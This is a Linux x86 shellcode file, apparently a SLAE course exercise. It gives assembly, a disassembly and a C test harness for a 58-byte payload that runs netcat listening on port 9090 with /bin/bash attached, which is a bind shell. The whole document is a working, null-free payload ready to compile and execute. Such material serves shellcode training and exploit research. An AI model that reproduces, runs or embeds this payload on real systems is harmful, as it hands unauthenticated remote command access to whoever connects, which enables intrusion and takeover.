/*

;
; Linux x86
; Author:  thryb
; Date:    13-07-16
; Purpose: /bin/nc -lp 9090 -le/bin/bash
; Size:    58 bytes
; ID:      SLAE-770 
;

global _start			

section .text
_start:

	; null
	xor eax, eax
	xor edx, edx	

	; reverse "/bin//nc"
	push eax
	push 0x636e2f2f
	push 0x6e69622f

	; mov "/bin//nc" addr to ebx
        mov ebx, esp

	; reverse "-ev/bin/bash"
	; hsab : 68736162
	; /nib : 2f6e6962
	; /el- : 2f656c2d
	push eax
	push 0x68736162
	push 0x2f6e6962
	push 0x2f656c2d

	; mov "-le/bin/bash" addr to esi
	mov esi, esp

	; reverse "-lp 9090"
	;0909 : 30393039
	; pl- : 20706c2d
	push eax
	push 0x30393039
	push 0x20706c2d

	; mov "-lp 9090" addr to edi
	mov edi, esp
       

	; prep for exec
	push edx ; null
	push esi ; arg2	
	push edi ; arg1
	push ebx ; /bin/nc

	; top of stack to ecx
	mov ecx, esp

	; execve syscall
	mov al, 0xB
	; init
	int 0x80


=============================================================================================

No null

nc-9090-bash-stack:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       31 d2                   xor    %edx,%edx
 8048064:       50                      push   %eax
 8048065:       68 2f 2f 6e 63          push   $0x636e2f2f
 804806a:       68 2f 62 69 6e          push   $0x6e69622f
 804806f:       89 e3                   mov    %esp,%ebx
 8048071:       50                      push   %eax
 8048072:       68 62 61 73 68          push   $0x68736162
 8048077:       68 62 69 6e 2f          push   $0x2f6e6962
 804807c:       68 2d 6c 65 2f          push   $0x2f656c2d
 8048081:       89 e6                   mov    %esp,%esi
 8048083:       50                      push   %eax
 8048084:       68 39 30 39 30          push   $0x30393039
 8048089:       68 2d 6c 70 20          push   $0x20706c2d
 804808e:       89 e7                   mov    %esp,%edi
 8048090:       52                      push   %edx
 8048091:       56                      push   %esi
 8048092:       57                      push   %edi
 8048093:       53                      push   %ebx
 8048094:       89 e1                   mov    %esp,%ecx
 8048096:       b0 0b                   mov    $0xb,%al
 8048098:       cd 80                   int    $0x80




*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2d\x6c\x65\x2f\x89\xe6\x50\x68"
"\x39\x30\x39\x30" // port 9090
"\x68\x2d\x6c\x70\x20\x89\xe7\x52\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
